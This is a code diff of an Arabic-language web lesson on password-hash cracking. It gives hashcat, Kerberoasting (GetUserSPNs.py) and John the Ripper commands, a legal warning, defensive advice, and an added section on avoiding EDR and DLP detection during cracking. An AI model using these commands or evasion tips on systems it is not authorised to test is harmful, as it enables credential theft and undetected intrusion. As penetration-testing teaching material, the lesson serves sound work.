@@ -6,16 +6,27 @@ export default function Page() {
     <LessonShell slug="password-cracking">
       <L
         ar={<>
-          <Section title="لماذا نكسر hashes أصلاً؟">
+          <Section title="ليه بنكسر hashes أصلاً؟">
             <Analogy>
-              تخيّل مكتبة قرّرت إنها تحتفظ بقايمة الكتب اللي قراها كل عضو، بس بدل اسم العضو حطّت بصمة (hash). أنت
-              مش هتقدر ترجّع الاسم من البصمة على طول، بس تقدر تاخد كل الأسامي اللي تعرفها، تحسب بصماتها، وتقارن.
-              ده بالظبط كسر الباسوردات: مش عكس الـ hash، إنما تخمين الـ password، تحسب hash، تقارن.
+              بُص.
+              مكتبة قرّرت تحتفظ بقايمة الكتب اللي قراها كل عضو..
+              بس بدل ما تكتب الاسم، حطّت بصمة (hash).
+
+              - طب أنا هرجّع الاسم من البصمة إزاي يا حضرتك؟؟
+
+              مارجعش يا مستجد. ولا حد بيرجّع.
+              إنت بتاخد كل الأسامي اللي تعرفها، تحسب بصماتها، وتقارن.
+              ده بالظبط كسر الباسوردات. مش عكس الـ hash — تخمين الـ password، حسبة، مقارنة.
             </Analogy>
             <p>
-              في أي engagement، هتلاقي نفسك جايب hashes من LSASS أو NTDS.dit أو /etc/shadow أو dump قاعدة بيانات. تكسرهم
-              يبقوا credentials بتنفع للـ lateral movement.
+              في أي engagement، هتلاقي نفسك جايب hashes من LSASS أو NTDS.dit أو /etc/shadow أو dump قاعدة بيانات. تكسرهم يبقوا credentials للـ lateral movement.
             </p>
+            <Callout kind="info" title="LinkedIn 2012">
+              6.5 مليون hash سُرّبت. كانت كلها SHA-1 بدون salt. في 72 ساعة الـ community كسر 90% منها.
+              ليه؟ unsalted SHA-1 بيتحسب على RTX حديث بـ ~50 GH/s.
+              لو كانت bcrypt، نفس الكسر كان هياخد آلاف السنين.
+              الفرق بين كارثة وانك متحصّن = اختيار خوارزمية صح. مش أكتر.
+            </Callout>
           </Section>
 
           <Section title="أنواع الـ hashes الشائعة">
@@ -30,37 +41,37 @@ PBKDF2-SHA256  — modern, slow (iOS keychain, 1Password)`}</Code>
           </Section>
 
           <Section title="Hashcat — أداة الميدان">
-            <Step n={1} title="بناء rig">
-              GPU = ضرورة. RTX 4090 يكسر 280 GH/s NTLM، سرعة عشرات أضعاف CPU. حتى GTX 1080 يكفي للبدء.
+            <Step n={1} title="جهّز الـ rig">
+              GPU مش رفاهية، ضروري. RTX 4090 بيكسر 280 GH/s NTLM، أسرع من الـ CPU بعشرات المرات. حتى GTX 1080 بيمشّيك في الأول.
             </Step>
             <Step n={2} title="هجوم بقاموس">
-              <Code lang="bash">{`# rockyou.txt = القاموس المفضل (14M password)
+              <Code lang="bash">{`# rockyou.txt = القاموس المفضّل (14M password)
 hashcat -m 1000 -a 0 ntlm-hashes.txt /usr/share/wordlists/rockyou.txt
 
 # -m 1000 = NTLM
 # -a 0 = straight wordlist`}</Code>
             </Step>
             <Step n={3} title="هجوم بـ rules">
-              قاعدة تعدّل كل كلمة (Capitalize، إضافة 2024، استبدال e بـ 3).
+              القاعدة بتعدّل على كل كلمة (Capitalize، تضيف 2024، تستبدل e بـ 3).
               <Code lang="bash">{`hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
-# best64.rule = 64 تعديل شائع، يضاعف فعالية القاموس بنسبة 5x-10x`}</Code>
+# best64.rule = 64 تحويلة شائعة، بتزوّد فعالية القاموس 5x-10x`}</Code>
             </Step>
             <Step n={4} title="Mask attack — بنية معروفة">
-              لو سياسة الشركة "8 حروف، رقم في النهاية"، استخدم mask.
+              السياسة "8 حروف ورقم في الآخر"؟ استخدم mask.
               <Code lang="bash">{`# ?u=upper ?l=lower ?d=digit ?s=symbol
 hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d
 # Spring2024! style:
 hashcat -m 1000 -a 3 hashes.txt -1 'Spring|Summer|Fall|Winter' ?1?d?d?d?d?s`}</Code>
             </Step>
             <Step n={5} title="Hybrid">
-              كلمة من القاموس + 4 أرقام في النهاية (تجمع الاثنين).
+              كلمة من القاموس + 4 أرقام في الآخر (تجمع الاتنين).
               <Code lang="bash">{`hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d`}</Code>
             </Step>
           </Section>
 
           <Section title="Kerberoasting workflow">
             <p>
-              الجوهرة: حسابات الخدمة في AD تستخدم كلمات مرور ضعيفة وقابلة للهاش. أي مستخدم نطاق يستطيع طلب TGS لها.
+              النقطة الذهبية: حسابات الخدمة في AD غالباً باسوردها ضعيف وقابل للـ hashing. وأي domain user يقدر يطلب لها TGS.
             </p>
             <Code lang="bash">{`# جلب الـ tickets
 GetUserSPNs.py -request corp.local/normaluser:Pass123 -dc-ip 10.0.0.10 -outputfile tgs.hashes
@@ -73,7 +84,7 @@ hashcat -m 13100 -a 0 tgs.hashes rockyou.txt -r best64.rule
 
           <Section title="JtR — للحالات التي يفشل فيها hashcat">
             <p>
-              John the Ripper جيد للأنواع الغريبة (KeePass، 1Password، PDF، ZIP). hashcat لـ GPU، John لـ CPU + المرونة.
+              John the Ripper تحفة في الأنواع الغريبة (KeePass، 1Password، PDF، ZIP). hashcat للـ GPU، John للـ CPU والمرونة.
             </p>
             <Code lang="bash">{`# تخمين تلقائي للـ hash type
 john --wordlist=rockyou.txt hashes.txt
@@ -84,19 +95,19 @@ john --wordlist=rockyou.txt kp.hash`}</Code>
           </Section>
 
           <Callout kind="danger" title="تحذير قانوني">
-            كسر hashes حصلت عليها من نظام لا تملكه أو dump بيانات مسرّب = جريمة. كل العمل هنا يفترض hashes
-            من مختبرك أو engagement مع authorization.
+            تكسر hashes جايبها من نظام مش بتاعك أو من dump مسرّب = جريمة. كل اللي إحنا بنشتغل عليه هنا مفترض إنه hashes
+            من معملك أو engagement عليه authorization.
           </Callout>
 
-          <Callout kind="good" title="الدفاع — لماذا تكون كلمة المرور مهمة">
+          <Callout kind="good" title="الحماية — اكتبها على إيدك">
             <ul>
-              <li>طول &gt; تعقيد: 16 حرف عشوائي أصعب من Pa$$w0rd1!</li>
-              <li>افرض passphrase 4 كلمات (دياقرام XKCD)</li>
-              <li>منع كلمات شائعة: HaveIBeenPwned API على signup</li>
-              <li>استخدم bcrypt/argon2id بدلاً من MD5/SHA — slow by design</li>
-              <li>MFA في كل مكان — يكسر hash لكنه لا يمر</li>
-              <li>راقب Kerberoasting: 4769 TGS requests غير اعتيادية</li>
-              <li>استخدم Group Managed Service Accounts (gMSA) — كلمات مرور 240 رمز تتغير تلقائياً</li>
+              <li>الطول &gt; التعقيد: 16 حرف random أصعب من Pa$$w0rd1!</li>
+              <li>افرض passphrase 4 كلمات (XKCD diceware).</li>
+              <li>اقفل الكلمات الشائعة: HaveIBeenPwned API على الـ signup.</li>
+              <li>استخدم bcrypt أو argon2id، مش MD5/SHA — slow by design.</li>
+              <li>MFA في كل مكان — الـ hash اتكسر، بس مش هيعدّي.</li>
+              <li>راقب Kerberoasting: 4769 TGS requests غير عادية.</li>
+              <li>استخدم gMSA (Group Managed Service Accounts) — باسوردات 240 حرف بتدور لوحدها.</li>
             </ul>
           </Callout>
 
@@ -117,6 +128,26 @@ Kerberoast (13100) rockyou    ≈ 8 ساعات per ticket
               <li>Hash-Identifier / hashid — تحديد نوع الـ hash</li>
               <li>CrackStation — lookup tables للـ hashes الضعيفة</li>
             </ul>
+          </Section>
+
+          <Section title="غلطات الـ junior — اللي بتكشف العملية">
+            <Callout kind="warn" title="لو فات عليك ده، يبقى مش بتراقب">
+              <ul>
+                <li>بيـ run الـ hashcat على الـ laptop المؤسسي. الـ EDR شايف "process بيستهلك GPU 100%" = alert فوري.</li>
+                <li>بينقل الـ NTDS.dit بحجم 5 GB على network share. الـ DLP بيمسكه قبل ما يخلص.</li>
+                <li>بيكسر الـ hashes كلها قبل ما يفلترها. 50 ألف user، الـ Domain Admin من ضمنهم بس هو اللي يهم.</li>
+                <li>بيستخدم rockyou.txt على hashes جايّة من بيئة غير-إنجليزية. الـ user بيستخدم باسوردات عربي/تركي/فرنسي. ما هتلاقي حاجة.</li>
+              </ul>
+              <p>الخلاصة: الـ cracking مش "اضغط زرار". هو فلترة + فهم للسياق + GPU. والأهم: لازم يكون على جهاز معزول، مش على endpoint مراقَب.</p>
+            </Callout>
+          </Section>
+
+          <Section title="الخلاصة الناشفة">
+            <p>الـ password ما اتكسرش — أنت اللي اخترته ضعيف.</p>
+            <p>اوعى تقول "إحنا عندنا policy تعقيد". الـ policy على ورق وبس.</p>
+            <p>الـ org اللي بتفرض 16-char passphrase + bcrypt/argon2 + MFA = الـ hashes بتاعتها بلا قيمة.</p>
+            <p>الـ org اللي عندها "Spring2024!" كباسورد لـ service account = اخترقت بالفعل، بس لسه ما عرفتش.</p>
+            <p>أنت ونصيبك في الآخر — يا الـ Kerberoast بيتمسك في 4 ثواني، يا قاعد جواك سنين.</p>
           </Section>
         </>}
 
